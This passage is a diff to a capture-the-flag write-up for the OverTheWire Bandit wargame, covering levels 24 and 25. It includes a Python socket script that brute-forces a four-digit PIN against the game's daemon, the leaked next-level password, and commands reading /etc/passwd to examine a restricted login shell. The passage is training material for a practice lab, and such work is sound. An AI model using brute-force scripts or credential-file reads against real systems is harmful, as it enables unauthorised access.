@@ -557,3 +557,72 @@ Wait for a bit then get the password from the file you designated.
 bandit23@bandit:~$ cat /tmp/tristan123/tristan
 VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
 ```
+
+
+## Bandit24
+
+Python Script to solve the level
+```
+import sys
+import socket
+
+hostname = sys.argv[1]
+port = int(sys.argv[2])
+
+password = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
+
+
+def netcat(host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host,port))
+    pin = 0000
+
+    data = sock.recv(1024)
+    print(data.decode())
+    while True:
+        payload = password + " " + str(pin).zfill(4)
+        #print(f"Sending: {payload}")
+        sock.send(payload.encode() + b"\n")
+        data = sock.recv(1024)
+        if("Try again." not in data.decode()):
+            print(data.decode())
+            break
+        else:
+            print(f"Attempting: {pin}")
+        pin += 1
+    sock.close()
+
+netcat(hostname, port)
+```
+
+```
+...
+Attempting: 9464
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+```
+
+## Bandit 25
+```
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+```
+
+```
+bandit25@bandit:~$ cat /etc/passwd
+...
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ ls -la /usr/bin | grep show
+...
+-rwxr-xr-x  1 root     root           58 Dec  3 08:14 showtext
+```
+
+showtext
+```
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+```
